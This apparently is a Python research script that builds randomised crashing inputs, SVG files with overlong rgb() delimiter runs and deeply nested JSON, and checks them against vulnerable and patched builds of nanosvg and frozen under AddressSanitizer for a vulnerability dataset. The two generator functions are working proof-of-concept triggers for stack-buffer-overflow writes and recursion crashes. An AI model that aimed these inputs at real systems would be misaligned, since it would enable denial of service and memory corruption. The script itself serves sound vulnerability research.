#!/usr/bin/env python3
"""
Construct class-diverse crashing inputs, verified individually by the sanitizer.

Fuzzing could not reach these classes. libFuzzer rewards small crashing inputs, so once
it finds the easy over-read it minimises away the deep nesting and the long scanset runs
that the recursion and stack-write bugs require. Every directed run collapsed back to
heap-buffer-overflow READ.

So these two classes are constructed rather than discovered, and each candidate is kept
only if the vulnerable build reports the intended class AND the patched build does not
fault. Provenance is recorded per input, because "constructed" is weaker evidence than
"found" and the paper must say so.

Randomisation is deliberate and broad: the shape, depth, delimiter, whitespace,
surrounding markup and element type all vary, so the class is not one template.
"""
import os, random, subprocess, sys, collections

S = os.path.expanduser("~/Documents/NemesisForge/handhunt/_cve/_staged")
ENV = dict(os.environ, ASAN_OPTIONS="abort_on_error=0:detect_leaks=0:symbolize=0")

def report(binary, data):
    try:
        p = subprocess.run([binary], input=data, capture_output=True, env=ENV, timeout=10)
        return (p.stdout + p.stderr).decode("utf-8", "replace")
    except subprocess.TimeoutExpired:
        return "TIMEOUT"

def kind(rep):
    for k in ("stack-overflow", "stack-buffer-overflow", "heap-buffer-overflow",
              "global-buffer-overflow", "SEGV"):
        if f"AddressSanitizer: {k}" in rep:
            acc = "WRITE" if "WRITE of size" in rep else "READ" if "READ of size" in rep else ""
            return k, acc
    return "", ""

def gen_write(rng):
    ch = rng.choice([",", " ", "%", "\t", ", ", "% ", ",\t", " ,", "%,"])
    n = rng.randint(35, 500)
    attr = rng.choice(["fill", "stroke"])
    tag = rng.choice(['rect', 'circle cx="1" cy="1" r="2"', 'path d="M0,0 L1,1"',
                      'ellipse rx="1" ry="2"', 'polygon points="0,0 1,1"'])
    extra = rng.choice(["", ' opacity="0.5"', ' stroke-width="2"', ' transform="scale(2)"'])
    ws = rng.choice(["", " ", "\n", "\n  "])
    head = rng.choice([f'<svg width="{rng.randint(1,999)}" height="{rng.randint(1,99)}">',
                       '<svg viewBox="0 0 10 10">', '<svg>'])
    return f'{head}{ws}<{tag} {attr}="rgb(1{ch*n}2{ch*n}3)"{extra}/>{ws}</svg>'.encode()

def gen_dos(rng):
    n = rng.randint(8000, 40000)
    style = rng.choice(["arr", "obj", "mix", "ws", "key"])
    if style == "arr":  s = "[" * n + "1" + "]" * n
    elif style == "obj": s = '{"a":' * n + "1" + "}" * n
    elif style == "mix": s = "".join(rng.choice("[{") for _ in range(n))
    elif style == "ws":  s = ("[" + rng.choice([" ", "\n", "\t"])) * n + "1"
    else:                s = ('{"' + rng.choice("abcxyz") + '":') * n + "1"
    return s.encode()

def build(name, vbin, pbin, maker, want, outdir, target_n, rng,
          require_patch_clean=True):
    os.makedirs(outdir, exist_ok=True)
    kept, tried, stats = 0, 0, collections.Counter()
    while kept < target_n and tried < target_n * 12:
        tried += 1
        data = maker(rng)
        k, acc = kind(report(vbin, data))
        got = (k, acc)
        stats[f"{k or 'clean'}{'/'+acc if acc else ''}"] += 1
        ok = (k == want[0]) and (want[1] is None or acc == want[1])
        if not ok:
            continue
        patched_faults = bool(kind(report(pbin, data))[0])
        if patched_faults:
            stats["patched-also-faults"] += 1
            # For an UNFIXED bug the patched build faults too, so a clean patched side
            # cannot be required. The sanitizer class is still correct; we record the
            # weaker provenance instead of discarding the class entirely.
            if require_patch_clean:
                continue
        open(os.path.join(outdir, f"{name}-{kept:04d}"), "wb").write(data)
        kept += 1
    print(f"  {name}: kept {kept}/{tried} -> {outdir}")
    for k, v in stats.most_common(6):
        print(f"      {v:5d}  {k}")
    return kept

if __name__ == "__main__":
    rng = random.Random(11)
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 150
    build("write", f"{S}/cve_nanosvg_color/vbin", f"{S}/cve_nanosvg_color/pbin",
          gen_write, ("stack-buffer-overflow", "WRITE"), "gen/write", n, rng)
    build("dos", f"{S}/cve_frozen_recursion/vbin", f"{S}/cve_frozen_recursion/pbin",
          gen_dos, ("stack-overflow", None), "gen/dos", n, rng,
          require_patch_clean=False)
